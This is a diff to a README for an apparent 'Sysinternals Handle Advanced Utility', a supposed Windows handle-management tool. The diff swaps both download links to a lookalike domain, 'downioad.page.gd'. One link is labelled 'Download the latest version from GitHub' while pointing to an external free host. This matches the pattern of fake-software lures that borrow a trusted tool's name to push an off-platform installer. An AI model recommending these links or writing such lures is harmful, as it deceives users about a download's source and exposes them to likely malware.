@@ -2,7 +2,7 @@
 
 The Sysinternals Handle Advanced Utility is a modern, enhanced tool designed to complement the classic Sysinternals Handle application, providing a more intuitive and powerful interface for managing system handles on Windows 10 and 11. This utility simplifies the process of monitoring open handles, filtering data, and exporting logs, making it an essential asset for system administrators, developers, and advanced users seeking to optimize system performance and troubleshoot issues efficiently. By offering a user-friendly dashboard and advanced features, the Sysinternals Handle Advanced Utility streamlines handle management without requiring deep command-line expertise.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -76,7 +76,7 @@ While this utility is primarily a standalone tool, we welcome feedback from the 
 
 For the latest version of the Sysinternals Handle Advanced Utility, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last updated: 2026*
 
